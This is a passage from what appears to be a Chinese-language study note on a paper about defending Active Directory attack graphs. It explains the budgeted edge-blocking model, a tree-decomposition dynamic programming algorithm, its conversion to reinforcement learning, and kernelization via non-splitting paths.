0.18X_{corn}+0.23X_{milk}+0.05X_{bread}\]</span></p>
<p><span class="math display">\[s.t.,\]</span></p>
<p><span
class="math display">\[107X_{corn}+500X_{milk}\le50000\]</span></p>
<p><span
class="math display">\[107X_{corn}+500X_{milk}\ge500\]</span></p>
<p><span
class="math display">\[72X_{corn}+121X_{milk}+65X_{bread}\le2250\]</span></p>
<p><span
class="math display">\[72X_{corn}+121X_{milk}+65X_{bread}\ge2000\]</span></p>
<p><span
class="math display">\[X_{corn},X_{milk},X_{bread}\ge0\]</span></p>
<p>现在回到之前的问题，如果在线性规划问题中有<strong>部分</strong>决策变量，比如上面的
<span class="math inline">\(X_{corn}\)</span> 要求必须是整数，
那么这时的规划问题就转变成混合整数线性规划问题了。</p>
</blockquote>
<p>这样，本文提出的算法可以扩展处理包含数万个节点的合成
<strong>AD</strong> 图。</p>
<h1 id="模型描述">模型描述</h1>
<p>如图所示，本文使用有向图 <span class="math inline">\(G=(V,E)\)</span>
来描述 <strong>AD</strong> 环境，每条边 <strong>e</strong>
都有一个攻击的失败率 <span class="math inline">\(f(e)\)</span>。</p>
<blockquote>
<p>节点 <strong>0</strong> 是 <strong>DA</strong>。节点
<strong>3、4、5</strong> 是入口节点（用 *
标记），边标签代表边的失败率，粗边（即 <strong>1 →
0</strong>）不可阻断。</p>
</blockquote>
<p>有一个目的节点 <strong>DA</strong> 和 <strong>s</strong>
个入口节点。攻击方可以从任意入口节点出发，选择任意路径。</p>
<p>目标是通过选择最佳入口节点和最佳攻击路径，最大限度地提高到达
<strong>DA</strong> 的成功率。</p>
<p>防守方从一组可阻断的边 <span class="math inline">\(E_b \subseteq
E\)</span> 中选择 <strong>b</strong> 条边进行阻断，其中
<strong>b</strong> 是防御预算。</p>
<p>防守方的目标是最小化攻击方攻击成功的概率。</p>
<p><img
src="/images/Paper-Scalable-Edge-Blocking-Algorithms-for-Defending-Active-Directory-Style-Attack-Graphs/image-20240112152819596.png" /></p>
<p>约束预算 <span class="math inline">\(\sum_{e \in E_b} B(e) \leq
b\)</span>。</p>
<ul>
<li>纯策略阻塞: <span class="math inline">\(B(e)\)</span> 等于 <span
class="math inline">\(0\)</span> 或 <span
class="math inline">\(1\)</span>。</li>
<li>混合策略阻塞: <span class="math inline">\(B(e)\)</span> 在 <span
class="math inline">\([0, 1]\)</span> 之间。</li>
</ul>
<p>给定
<strong>B</strong>，可以通过以下公式找到攻击者的最优攻击路径：<span
class="math inline">\(max_{p\in P}\{\prod_{e\in
p}(1-f(e))(1-B(e))\}\)</span>，其中 <strong>P</strong>
是所有入口节点到所有攻击路径的集合。</p>
<p>这个最大化问题等价于 <span class="math inline">\(min_{p\in
P}\{\sum_{e\in p}(-ln(1-f(e))-ln(1-B(e)))\}\)</span>。</p>
<p>通过应用自然对数将乘积转换为求和，本文将一条边的“距离”视为 <span
class="math inline">\(-ln(1-f(e))-ln(1-B(e))\)</span> 【非负数】。</p>
<p>攻击者的最优攻击路径可以使用 <strong>Dijkstra</strong>
的最短路径算法。</p>
<p><span class="math inline">\(SR(B)\)</span> 表示面对阻挡策略 <span
class="math inline">\(B\)</span> 的攻击者的成功率，防御者的问题是最小化
<span class="math inline">\(SR(B)\)</span>，即降低攻击者的成功率。</p>
<p>本文的第一个结果是一个负面结果，表明仅有短攻击路径是不足以推导出高效算法的。也就是说，接下来确实需要考虑树状特征。</p>
<blockquote>
<p>说实话读到这里的时候我没找到文中所谓的负面结果究竟指什么。</p>
</blockquote>
<p><strong>定理1：对于常数最大攻击路径长度，纯策略和混合策略阻挡都是NP难的。</strong></p>
<blockquote>
<p>由于篇幅限制，证明被推迟到附录中。</p>
</blockquote>
<h1
id="用于纯策略阻挡的基于动态规划的树分解">用于纯策略阻挡的基于动态规划的树分解</h1>
<p>对于普通图的许多NP难的组合问题，如果专注于树宽度小的图，这些问题就变得易于处理。</p>
<blockquote>
<p>本文使用节点来指代树分解中的树节点，使用顶点来指代
<strong>AD</strong> 图中的顶点。</p>
</blockquote>
<h2 id="两个假设">两个假设</h2>
<ol type="1">
<li>树宽较小</li>
<li>一条路径的成功率来自一个最多包含 <strong>H</strong>
个值的小集合</li>
</ol>
<blockquote>
<p>路径的成功率是攻击者在没有任何阻挡的情况下通过它的成功率，如果所有边都有相同的失败率，则
<strong>H</strong> 仅为最大攻击路径长度
<strong>l+2</strong>（<strong>0～l</strong> 跳，加上“无路径”）。</p>
<ul>
<li><strong>0 到 l 跳</strong>：这表示攻击路径可以从 <strong>0</strong>
跳（即没有任何移动，路径长度为 <strong>0</strong>）到 <strong>l</strong>
跳（路径包含 <strong>l</strong> 个移动步骤）。这里的 <strong>l</strong>
代表攻击路径的最大长度。</li>
<li><strong>“无路径”</strong>：这是一个特殊情况，指的是不存在从起点到终点的有效路径。在分析攻击路径时，考虑“无路径”的情况是重要的，因为它表示攻击者无法成功到达目标。</li>
</ul>
</blockquote>
<p>一般来说，如果边的类型数量是一个小常数 <strong>k</strong>，那么 <span
class="math inline">\(H \in O(l^k)\)</span>。</p>
<p>在本文的实验中，<strong>假设有两种类型的边【高失败率和低失败率】</strong>，因此有
<span class="math inline">\(H \in O(l^2)\)</span>，【<strong>H</strong>
仅用于最坏情况下的复杂性分析】。</p>
<p>在实验中，对于给定的特定图，一条路径可能的成功率数量通常显著较少。</p>
<h2 id="步骤">步骤</h2>
<p>本文的动态规划称为
<strong>TDCYCLE</strong>（具有循环的树分解），其将攻击图视为一个无向图，然后生成一个树分解。</p>
<p>在本文的实验中，采用<a
href="https://doi.org/10.1007/11786986_59">顶点消除启发式方法生成树分解</a>。</p>
<p>然后将得到的<a
href="https://link.springer.com/book/10.1007/978-3-319-21275-3">树分解转换为
<strong>nice</strong> 树分解</a>，其中根节点是一个只包含
<strong>DA</strong> 的包，所有叶节点是大小为 <strong>1</strong>
的包。</p>
<p>本文用 <span class="math inline">\(TD\)</span> 来表示得到的
<strong>nice</strong> 树分解。<span class="math inline">\(TD\)</span> 有
<span class="math inline">\(O(wn)\)</span> 个节点，其中 <span
class="math inline">\(w\)</span> 是树宽度。</p>
<h2 id="引理-1">引理 1</h2>
<p>设 <span class="math inline">\((u, v)\)</span> 是 <strong>AD</strong>
图中的任意一条边。在 <span class="math inline">\(TD\)</span>
下，有且仅有一个“遗忘”节点 <span
class="math inline">\(X\)</span>，其子节点记为 <span
class="math inline">\(X&#39;\)</span>，其中 <span
class="math inline">\(\{u, v\} \subseteq X&#39;\)</span> 且 <span
class="math inline">\(X&#39; \backslash X\)</span> 是 <span
class="math inline">\(\{u\}\)</span> 或 <span
class="math inline">\(\{v\}\)</span>。</p>
<blockquote>
<p><span class="math inline">\(X&#39; \backslash X\)</span>
表示集合的差集，即从集合 <span class="math inline">\(X&#39;\)</span>
中去除掉在集合 <span class="math inline">\(X\)</span>
中出现的所有元素后剩下的元素集合。</p>
<p>设想树分解的一个可能的情况是这样的：</p>
<ol type="1">
<li><strong>开始节点</strong>：包含 <span class="math inline">\(\{A, B,
C\}\)</span></li>
<li><strong>子节点 1</strong>：包含 <span class="math inline">\(\{B, C,
D\}\)</span> (这里 <span class="math inline">\(A\)</span>
被“遗忘”，因为它不在子节点中)</li>
</ol>
<p>那么这里的遗忘节点 <span class="math inline">\(X\)</span> 即是 <span
class="math inline">\(\{B, C,
D\}\)</span>，因为它是发生顶点遗忘后的结果。而子节点 <span
class="math inline">\(X&#39;\)</span> 是 <span
class="math inline">\(\{A, B,
C\}\)</span>，因为它是在顶点遗忘之前的状态。</p>
</blockquote>
<p>上述引理基本上表明，<strong>每条边都可以准确地“分配”给一个遗忘节点</strong>。对于遗忘节点
<span class="math inline">\(X \, (x_2, x_3, ..., x_k)\)</span>
与其子节点 <span class="math inline">\(C \, (x_1, x_2, ...,
x_k)\)</span>【即 <span class="math inline">\(x_1\)</span>
被遗忘】，本文将 <span class="math inline">\(x_1, x_2, ..., x_k\)</span>
之间的所有边分配给这个遗忘节点。</p>
<h3 id="动态规划的主要过程">动态规划的主要过程</h3>
<ol type="1">
<li>首先从图中移除所有边，然后自下而上地遍历 <span
class="math inline">\(TD\)</span>。</li>
<li>在遗忘节点 <span class="math inline">\(X\)</span> 处，首先检查分配给
<span class="math inline">\(X\)</span> 的所有边。
<ol type="1">
<li>如果一条边不可阻挡或决定不阻挡，则将其重新放入图中。</li>
<li>否则，不将其放回。</li>
</ol></li>
<li>在完成整棵树后（同时确保花费的预算最多为 <span
class="math inline">\(b\)</span>，至少放回了 <span
class="math inline">\(|E| - b\)</span>
条边），得到了一个完整的阻挡策略。</li>
</ol>
<h3 id="设定">设定</h3>
<p>设 <span class="math inline">\(X=(x_1, x_2, ..., x_k)\)</span>
是一个树节点 <span class="math inline">\((k \le w + 1)\)</span>。</p>
<p>设 <span class="math inline">\(St(X)\)</span> 是以 <span
class="math inline">\(X\)</span> 为根的树分解 <span
class="math inline">\(TD\)</span> 中的子树。</p>
<p>设 <span class="math inline">\(Ch(X)\)</span> 是 <span
class="math inline">\(St(X)\)</span> 中引用的所有图顶点的集合。</p>
<p>设 <span class="math inline">\(Ch(X)&#39; = Ch(X) \backslash
X\)</span>。</p>
<p>那么，<span class="math inline">\(Ch(X)&#39;\)</span>
就是在自底向上处理 <span class="math inline">\(St(X)\)</span>
后的一个遗忘顶点的集合。树分解的一个已知属性是，<span
class="math inline">\(Ch(X)&#39;\)</span> 中的顶点不能直接到达 <span
class="math inline">\(V \backslash Ch(X)\)</span>
中的任何顶点。也就是说，任何从 <span
class="math inline">\(Ch(X)&#39;\)</span> 中的入口顶点到 <span
class="math inline">\(DA\)</span>（域管理员）的攻击路径都必须经过 <span
class="math inline">\(X\)</span> 中的某个 <span
class="math inline">\(x_i\)</span>。</p>
<p>同样，任何攻击路径（不一定起源于 <span
class="math inline">\(Ch(X)&#39;\)</span>）可能通过进入由 <span
class="math inline">\(Ch(X)&#39;\)</span> 形成的图区域（通过某个特定的
<span class="math inline">\(x_i\)</span>），然后通过不同的节点 <span
class="math inline">\(x_j\)</span> 退出该区域，从而涉及 <span
class="math inline">\(Ch(X)&#39;\)</span>
中的顶点。一个攻击路径可能多次“进入和退出”该区域，但所有的进入和退出都必须通过
<span class="math inline">\(X\)</span> 中的顶点。</p>
<blockquote>
<p>有一个图，它由顶点 <span class="math inline">\(A, B, C, D, E\)</span>
组成，并且有以下连接：<span class="math inline">\(A-B, B-C, C-D,
D-E\)</span>。现在，对这个图进行树分解。</p>
<ol type="1">
<li>假设有一个树节点 <span class="math inline">\(X = (B,
C)\)</span>，这意味着树分解中有一个节点包含图中的 <span
class="math inline">\(B\)</span> 和 <span
class="math inline">\(C\)</span> 顶点。</li>
<li><span class="math inline">\(St(X)\)</span> 就是以 <span
class="math inline">\(X\)</span>
为根的子树，在简单例子中，可以想象它就是包含 <span
class="math inline">\(B\)</span> 和 <span
class="math inline">\(C\)</span> 的部分，可能还会向下包括与 <span
class="math inline">\(B\)</span> 和 <span
class="math inline">\(C\)</span> 直接相连的其他顶点，比如 <span
class="math inline">\(A\)</span> 和 <span
class="math inline">\(D\)</span>。</li>
<li><span class="math inline">\(Ch(X)\)</span> 是在 <span
class="math inline">\(St(X)\)</span>
中引用的所有顶点的集合。在例子中，如果 <span
class="math inline">\(St(X)\)</span> 包括边 <span
class="math inline">\(B-A\)</span> 和 <span
class="math inline">\(C-D\)</span>，那么 <span
class="math inline">\(Ch(X)\)</span> 就是 <span
class="math inline">\(\{A, B, C, D\}\)</span>。</li>
<li><span class="math inline">\(Ch(X)&#39;\)</span> 是 <span
class="math inline">\(Ch(X)\)</span> 移除 <span
class="math inline">\(X\)</span> 中顶点后的集合，所以 <span
class="math inline">\(Ch(X)&#39; = \{A, D\}\)</span>，这表示在处理完包含
<span class="math inline">\(B\)</span> 和 <span
class="math inline">\(C\)</span> 的树节点后，<span
class="math inline">\(A\)</span> 和 <span
class="math inline">\(D\)</span>
是“被忘记的”或者说是“不再考虑的”顶点。</li>
</ol>
<p>现在，根据树分解的性质，<span
class="math inline">\(Ch(X)&#39;\)</span> 中的顶点 <span
class="math inline">\((A,D)\)</span> 不能直接到达图中不在 <span
class="math inline">\(Ch(X)\)</span> 中的任何顶点（比如 <span
class="math inline">\(E\)</span>）。这意味着，任何从 <span
class="math inline">\(A\)</span> 或 <span
class="math inline">\(D\)</span> 到达图中其他部分（比如到达
E）的路径都必须经过 B 或 C。</p>
<p>举个具体的例子：</p>
<ul>
<li>如果有一个攻击路径想从 <span class="math inline">\(A\)</span> 到达
<span class="math inline">\(E\)</span>，这个路径必须经过 <span
class="math inline">\(B\)</span> 或 <span
class="math inline">\(C\)</span>（因为 <span
class="math inline">\(A\)</span> 是通过 <span
class="math inline">\(B\)</span> 连接的，而 <span
class="math inline">\(E\)</span> 是通过 <span
class="math inline">\(D\)</span> 和 <span
class="math inline">\(C\)</span> 连接的）。</li>
<li>同样，如果攻击路径在图中的某个点进入了 A 和 D
形成的区域，然后想要离开这个区域去到图的其他部分，它也必须通过 <span
class="math inline">\(B\)</span> 或 <span
class="math inline">\(C\)</span> 进行。</li>
</ul>
</blockquote>
<p>这个引理及其描述的动态规划过程为如何在给定的预算约束下制定有效的阻挡策略提供了一种方法。</p>
<p>通过结构化地处理图中的每条边，可以确保在满足预算限制的同时实现最优的阻挡配置。</p>
<p>在这种情境下，假设在处理树分解中的 <span
class="math inline">\(St(X)\)</span>（即以 <span
class="math inline">\(X\)</span> 为根的子树）时，已经花费了 <span
class="math inline">\(b&#39;\)</span>
单位的预算来“忘记节点”，也就是说，用于阻断与这些被忘记节点相关的边。</p>
<p>关键在于不需要详细记录哪些具体的边被阻断。相反，只需跟踪总共的预算花费以及一个所谓的“距离”矩阵。</p>
<blockquote>
<p>这个矩阵用于表示在考虑到已经使用的阻断预算后，图中各顶点之间可达性的变化。</p>
<p>即在执行了一系列阻断操作后，从一个顶点到另一个顶点是否仍然存在未被阻断的路径，以及这些路径的“距离”（路径的长度或者需要通过的边的数量）。</p>
<p>假设有一个小型网络，顶点集合为 <span class="math inline">\(\{A, B, C,
D\}\)</span>，目标是阻断攻击者从 <span class="math inline">\(A\)</span>
达到 <span class="math inline">\(D\)</span> 的能力。</p>
<p>如果决定花费一定的预算来阻断从 <span class="math inline">\(B\)</span>
到 <span class="math inline">\(C\)</span> 的连接（假设这是忘记节点 <span
class="math inline">\(B\)</span> 与 <span
class="math inline">\(C\)</span>
相关的操作的一部分），矩阵需要更新以反映现在从 <span
class="math inline">\(A\)</span> 到 <span
class="math inline">\(D\)</span>
的路径要么变得更长（需要通过更多的边），要么变得不可达（如果没有其他路径）。</p>
<p>因此，即使不记录每一条被阻断的边，通过维护总预算花费和更新“距离”矩阵，仍然能够有效地理解和控制网络的安全状况，尤其是在考虑到预算限制和操作的优化配置时。</p>
<p>这种方法在处理大型或复杂网络时特别有用，它可以更抽象的方式理解网络的安全性，而不是沉浸在繁琐的细节中。</p>
</blockquote>
<p><span class="math display">\[
M = \begin{bmatrix} d_{11} &amp; d_{12} &amp; ... &amp; d_{1k} \\ ...
\\  d_{k1} &amp; d_{k2} &amp; ... &amp; d_{kk}  \\ \end{bmatrix}\quad
\]</span></p>
<p><span class="math display">\[
M = \begin{bmatrix} 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\ 0.05 &amp; 0
&amp; 0.05 &amp; 0.05 &amp; 0 \\ 0.05 &amp; 0 &amp; 0 &amp; 0 &amp; 0 \\
0 &amp; 0 &amp; 0 &amp; 0 &amp; 0.05 \\ 0.05 &amp; 0.05 &amp; 0 &amp; 0
&amp; 0 \\ \end{bmatrix}\quad
\]</span></p>
<p><span class="math inline">\(d_{ij}\)</span> 代表了处理完 <span
class="math inline">\(St(X)\)</span> 后放回的边中，从 <span
class="math inline">\(x_i\)</span> 到 <span
class="math inline">\(x_j\)</span> 的最小路径距离。</p>
<p>当且仅当可以在 <span class="math inline">\(St(X)\)</span> 上花费
<span class="math inline">\(b&#39; (b&#39; \le b)\)</span>
来获得距离矩阵 <span class="math inline">\(M\)</span> 时，则称元组 <span
class="math inline">\((M, b&#39;)\)</span> 在 <span
class="math inline">\(X\)</span> 是可能的。</p>
<p>树分解的每个树节点对应一个动态规划子问题，总共有 <span
class="math inline">\(O(wn)\)</span> 个这样的子问题，其中 <span
class="math inline">\(w\)</span> 是树的宽度，<span
class="math inline">\(n\)</span> 是图的顶点数量。</p>
<p>与 <span class="math inline">\(X\)</span> 对应的子问题表示为 <span
class="math inline">\(DP(X)\)</span>，它简单地返回在节点 <span
class="math inline">\(X\)</span> 可能的所有元组集合。</p>
<blockquote>
<p>这种方法通过将大问题分解成较小的子问题来解决，每个子问题都是关于树节点的，并考虑在该节点上可实现的所有可能的预算花费和距离矩阵组合。</p>
<p>这样，每个子问题都可以独立解决，并且它们的解可以用来构建整个问题的解。</p>
<p>动态规划的这种方法允许算法有效地遍历整个问题空间，同时避免重复计算已解决的子问题，从而提高了算法的效率。</p>
<p>举个简单的例子，如果在处理某个节点 <span
class="math inline">\(X\)</span> 时发现可以通过花费 <span
class="math inline">\(b&#39;\)</span>
单位的预算来阻断某些边，并且这导致了从一个顶点到另一个顶点的最小路径距离发生变化，那么这个新的距离矩阵和预算花费
<span class="math inline">\(b&#39;\)</span> 就构成了一个可能的元组 <span
class="math inline">\((M, b&#39;)\)</span>。</p>
<p><span class="math inline">\(DP(X)\)</span>
的任务就是找出所有这样的可能元组，为进一步的计算和最终解的构建提供基础。</p>
</blockquote>
<h3 id="基础设定">基础设定</h3>
<ul>
<li>对于一个叶子节点 <span class="math inline">\(X =
\{x\}\)</span>，如果 <span class="math inline">\(x\)</span>
是一个入口顶点，那么 <span class="math inline">\(DP(X)\)</span>
包含一个元组，即 <span
class="math inline">\(([0],0)\)</span>。这表示从这个入口顶点到它自身的最小路径距离为
<span
class="math inline">\(0\)</span>，且没有预算被花费（因为不需要阻断任何路径）。</li>
<li>否则，如果 <span class="math inline">\(x\)</span>
不是入口顶点，<span class="math inline">\(DP(X)\)</span>
中唯一可能的元组是 <span
class="math inline">\(([\infty],0)\)</span>。这表示从这个顶点到任何入口顶点（或反之）的距离是无穷大，即不可达，同时没有预算被花费。</li>
</ul>
<h3 id="原始问题">原始问题</h3>
<ul>
<li>树分解的根是 <span
class="math inline">\(DA\)</span>，因此，原始问题则是 <span
class="math inline">\(DP(\{DA\})\)</span>，它返回根节点所有可能的元组集合。</li>
<li>集合中的每个元组都有形式 <span class="math inline">\(([d_{DA,DA}],
b&#39;)\)</span>，这表示可以花费 <span
class="math inline">\(b&#39;\)</span> 预算来确保攻击者到达 <span
class="math inline">\(DA\)</span> 的最小路径距离是 <span
class="math inline">\(d_{DA,DA}\)</span>。</li>
<li><span class="math inline">\(DP(\{DA\})\)</span> 中的最大 <span
class="math inline">\(d_{DA,DA}\)</span>
对应于面对最优阻断策略时攻击者的成功率。换句话说，它表示即使在最优的阻断策略下，攻击者也能达到的最远距离。因此，防御的目标是最大化这个距离，以最大限度地减少攻击者成功攻击域管理员的可能性。</li>
</ul>
<h3 id="引入节点-introduce-node">引入节点 (Introduce Node)</h3>
<ul>
<li>当处理一个引入节点 <span class="math inline">\(X = (x_1, ..., x_k,
y)\)</span> ，其子节点为 <span class="math inline">\(X&#39; = (x_1, ...,
x_k)\)</span> 时，需要从 <span class="math inline">\(DP(X&#39;)\)</span>
中的可能元组出发，生成新的元组，其应该属于 <span
class="math inline">\(DP(X)\)</span>。</li>
<li>如果 <span class="math inline">\(y\)</span> 是一个入口顶点，则 <span
class="math inline">\(d_{yy}=0\)</span>；否则当 <span
class="math inline">\(y\)</span> 被引入时，它的所有边尚未恢复，因此它与
<span class="math inline">\(x_i\)</span> 断开连接，<span
class="math inline">\(d_{yy}=\infty\)</span>。</li>
<li>这样，可以在 <span class="math inline">\(DP(X)\)</span> 中为每个来自
<span class="math inline">\(DP(X&#39;)\)</span>
的可能元组添加了一个新顶点 <span
class="math inline">\(y\)</span>，并设置了 <span
class="math inline">\(y\)</span> 到自身的距离。</li>
</ul>
<p><span class="math display">\[
\begin{pmatrix} \begin{bmatrix} d_{11} &amp; ... &amp; d_{1k} \\ ...
\\  d_{k1} &amp; ... &amp; d_{kk}  \\ \end{bmatrix}\quad,b&#39;
\end{pmatrix} \rightarrow \begin{pmatrix} \begin{bmatrix} d_{11}
&amp;  ... &amp; d_{1k} &amp; \infty \\ ... \\  d_{k1} &amp; ... &amp;
d_{kk} &amp; \infty \\ \infty &amp; ... &amp; \infty &amp; d_{yy}
\end{bmatrix}\quad,b&#39; \end{pmatrix}
\]</span></p>
<h3 id="遗忘节点-forget-node">遗忘节点 (Forget Node)</h3>
<ul>
<li>对于一个遗忘节点 <span class="math inline">\(X = (x_2, ...,
x_k)\)</span>，其子节点为 <span class="math inline">\(X&#39; = (x_1,
..., x_k)\)</span> ，需要确定如何阻断连接 <span
class="math inline">\(x_1\)</span> 和其余 <span
class="math inline">\(x_2, ..., x_k\)</span> 的边。</li>
<li>因为最多有 <span class="math inline">\(k − 1\)</span>
条边需要阻断，需要简单地检查最多 <span
class="math inline">\(2^{k-1}\)</span> 种阻断选项。</li>
<li>对于每个具体的阻断选项（对应于花费 <span
class="math inline">\(b^{&#39;&#39;}\)</span>），需要将 <span
class="math inline">\(DP(X&#39;)\)</span> 中的元组转换为 <span
class="math inline">\(DP(X)\)</span> 中的元组(如果 <span
class="math inline">\(b&#39;+b&#39;&#39;&gt;b\)</span>，则新元组被丢弃)。<span
class="math inline">\(d_{ij}^{&#39;}\)</span>
是来考虑新加回的边的更新距离。更新距离需要运行一个全点对最短路径算法，其复杂度为
<span class="math inline">\(O(k^3)\)</span>。</li>
</ul>
<p><span class="math display">\[
\begin{pmatrix} \begin{bmatrix} d_{11} &amp; ... &amp; d_{1k} \\ ...
\\  d_{k1} &amp; ... &amp; d_{kk}  \\ \end{bmatrix}\quad,b&#39;
\end{pmatrix} \rightarrow \begin{pmatrix} \begin{bmatrix} d^{&#39;}_{22}
&amp;  ... &amp; d^{&#39;}_{2k}\\ ... \\  d^{&#39;}_{k2} &amp; ... &amp;
d^{&#39;}_{kk} \\ \end{bmatrix}\quad,b&#39; + b&#39;&#39; \end{pmatrix}
\]</span></p>
<h3 id="连接节点-join-node">连接节点 (Join Node)</h3>
<ul>
<li>对于一个连接节点 <span
class="math inline">\(X\)</span>，它有两个子节点 <span
class="math inline">\(X_1\)</span> 和 <span
class="math inline">\(X_2\)</span>。对于 <span
class="math inline">\((M_1,b_1) \in DP(X_1)\)</span> 和 <span
class="math inline">\((M_2,b_2) \in DP(X_2)\)</span>，如果 <span
class="math inline">\(b_1+b_2\leb\)</span>，则标记 <span
class="math inline">\((M&#39;,b1+b2)\)</span> 为 <span
class="math inline">\(DP(X)\)</span> 中的一个可能元组。</li>
<li><span class="math inline">\(M&#39;\)</span> 是 <span
class="math inline">\(M_1\)</span> 和 <span
class="math inline">\(M_2\)</span> 之间按元素取最小值得到的矩阵。</li>
</ul>
<p>通过这种递归方式，动态规划算法能够在考虑图的结构和预算限制的同时，逐步构建出解决问题的解空间。</p>
<p>其每一步都精确地考虑了如何通过引入、遗忘或连接操作来更新当前的状态，使得最终能够在树分解的根节点找到原始问题的解。</p>
<p><strong>定理2 TDCYCLE 算法的复杂度为 <span
class="math inline">\(O(H^{2w^2}b^2w^2n)\)</span></strong></p>
<p>总结动态规划方法。</p>
<ol type="1">
<li>其遵循自底向上的顺序（从树分解 <span
class="math inline">\(TD\)</span> 的叶子节点到根节点）处理。</li>
<li>在处理节点时，传播所有可能的元组集合 <span class="math inline">\((M,
b&#39;)\)</span>。</li>
<li>在引入/连接节点时，遵循预定的传播规则，不做任何阻断决策。</li>
<li>在遗忘节点时，从最多 <span class="math inline">\(w\)</span>
条边中决定哪些边要阻断。</li>
</ol>
<p>给定一个特定的 <span class="math inline">\(AD\)</span>
图及其对应的树分解 <span
class="math inline">\(TD\)</span>，可以通过动态规划转换为强化学习环境。</p>
<p>这样便出现了一个比动态规划有更好扩展性的随时算法（即强化学习总能产生一个解决方案，这个解决方案可能是最优的，也可能不是，但通常会随着时间改进；另一方面，动态规划无法扩展以处理稍大的树宽度）。</p>
<p>本文提出的转换技术有可能被应用到基于树分解的动态规划中，用于其他组合优化问题。</p>
<p>这表明，通过将传统的动态规划方法与现代的机器学习技术相结合，可以提高处理复杂问题的能力，特别是在那些难以直接通过传统方法解决的大规模问题上。</p>
<p>通过这种转换，可以利用强化学习的优点，如能够处理大规模状态空间和学习复杂策略，从而提高算法的适应性和扩展性。</p>
<ol type="1">
<li><strong>节点排序</strong>：本文通过在 <span
class="math inline">\(TD\)</span>
上执行后序遍历来创建节点的顺序，确保在处理父节点之前先处理子节点。这样的顺序保证了在做出决策时已经考虑了所有子节点的信息。</li>
<li><strong>传播最佳元组</strong>：与传统动态规划中传播所有可能的元组
<span class="math inline">\((M, b&#39;)\)</span>
不同，本文在强化学习训练过程中只传播最佳元组。举个例子，对于一个遗忘节点
<span class="math inline">\(X\)</span> 和它的子节点 <span
class="math inline">\(X&#39;\)</span>，<span
class="math inline">\(X&#39;\)</span> 处的最佳元组被作为观察传递给 <span
class="math inline">\(X\)</span>。然后，基于这个观察来决定在 <span
class="math inline">\(X\)</span> 阻断哪些边。</li>
<li><strong>遗忘节点的特定处理</strong>：对于遗忘节点 <span
class="math inline">\(X\)</span>，如果有 <span class="math inline">\(k
(k \le w)\)</span> 条边需要决定是否阻断，则在强化学习环境中将其视为
<span class="math inline">\(k\)</span>
个独立的步骤。也就是说，每一步都对单一边做出阻断决策，且动作空间始终是二元的。</li>
<li><strong>引入/连接节点的自动处理</strong>：对于引入节点和连接节点，由于不需要做出任何决策，强化学习环境会在步骤之间自动处理这些节点。</li>
<li><strong>最终奖励设置</strong>：设置的最终奖励等同于解决方案的质量。因为强化学习模型的目标是最大化最终奖励，从而找到最优或接近最优的阻断策略。</li>
</ol>
<p>将特定的 <span class="math inline">\(AD\)</span>
图转化为强化学习环境后，可以应用标准的强化学习算法来寻找最优阻塞策略。</p>
<p>在转化后，当树的宽度较小时，观察和行动空间都很小。不幸的是，上述转化技术的一个缺点是无法保证有一个小的
<strong>episode</strong> 长度。</p>
<p>本文可以认为同时保证小的观察空间、小的行动空间和小的
<strong>episode</strong> 长度是不可能的，除非 <span
class="math inline">\(AD\)</span>
图在规模上相对较小。毕竟，这解决的是一个 <strong>NP</strong>
难问题。</p>
<p>实验证明，对于较小的 <span class="math inline">\(AD\)</span>
图，本文能够在 <strong>episode</strong>
长度可管理的情况下实现接近最优的性能。</p>
<p>对于较大的 <span class="math inline">\(AD\)</span>
图，<strong>episode</strong> 长度太长，因此引入以下启发式方法来限制
<strong>episode</strong> 长度。</p>
<ol type="1">
<li>设 T 为目标 <strong>episode</strong> 长度，想法是手动选择
<strong>T</strong> 个相对重要的边，并将未选择的边设置为不可阻塞。</li>
<li>在实验中，首先计算将入口节点与 <strong>DA</strong>
分开的最小割（不可阻塞边的容量设置为大），令最小割中可阻塞边的数量为
<span class="math inline">\(C\)</span>。</li>
<li>如果 <span class="math inline">\(C \ge T\)</span>，则简单地将这
<span class="math inline">\(C\)</span> 条边视为重要，并将
<strong>episode</strong> 长度设置为 <span
class="math inline">\(C\)</span>。</li>
<li>如果 <span class="math inline">\(C &lt; T\)</span>，则加入距离 <span
class="math inline">\(DA\)</span> 最近的 <span class="math inline">\(T −
C\)</span> 条可阻塞边。</li>
</ol>
<p>在本文附录中，有一个实验证明基于强化学习的方法并非仅通过探索进行“随机搜索”，它确实能够“学习”以对给定观察做出反应。</p>
<p>在原始方法中，观察包含距离矩阵 <span
class="math inline">\(M\)</span>、已花费的预算 $<span
class="math inline">\(b&#39;\)</span>
以及当前步骤索引。如果用零矩阵或随机矩阵替换 <span
class="math inline">\(M\)</span>，那么训练结果会显著下降。</p>
<h1 id="核化">核化</h1>
<blockquote>
<p>核化是一种常用的固定参数分析技术，它预处理给定的问题实例，并将其转换为一个更小的等价问题，称为内核。</p>
</blockquote>
<p>本文要求内核的大小受到特殊参数的限制（而不是依赖于 <span
class="math inline">\(n\)</span>）。</p>
<p>如引言所述，对于实际的 <span class="math inline">\(AD\)</span>
图，大多数节点最多只有一个出边。</p>
<ul>
<li>如果一条边对攻击者没有用处，那么可以在不失一般性的情况下将其移除。</li>
<li>如果一条边对攻击者有用，那么通常它是特权提升的。</li>
<li>一个节点具有两条独立的特权提升出边是少见的（因为它们通常对应于安全异常或配置错误）。</li>
</ul>
<p>本文使用 <span class="math inline">\(SPLIT\)</span>
来表示所有分裂节点（具有多个出边的节点）；<span
class="math inline">\(SPLIT+DA\)</span> 来表示在 <span
class="math inline">\(SPLIT\)</span> 中添加 <span
class="math inline">\(DA\)</span>；<span
class="math inline">\(ENTRY\)</span>
来表示所有入口节点；引入了一个新参数，称为非分裂路径的数量。</p>
<p>实验表明，这个参数导致了算法在使用两个不同的开源 <span
class="math inline">\(AD\)</span> 图生成器生成的合成 <span
class="math inline">\(AD\)</span> 图上表现异常优秀。</p>
<h2 id="定义-1非分裂路径">定义 1（非分裂路径）</h2>
<p>给定节点 <span class="math inline">\(u\)</span>，假设 <span
class="math inline">\(v\)</span> 是 <span
class="math inline">\(u\)</span> 的一个后继节点。非分裂路径 <span
class="math inline">\(NSP(u, v)\)</span> 被递归地定义如下：</p>
<ul>
<li>如果 <span class="math inline">\(v \in SPLIT + DA\)</span>，则 <span
class="math inline">\(NSP(u, v)\)</span> 是 <span
class="math inline">\(u \to v\)</span>。</li>
<li>否则，<span class="math inline">\(v\)</span> 必须有唯一的后继节点
<span class="math inline">\(v&#39;\)</span>。<span
class="math inline">\(NSP(u, v)\)</span> 是将 <span
class="math inline">\(u \to v\)</span> 与 <span
class="math inline">\(NSP(v, v&#39;)\)</span> 结合的路径。</li>
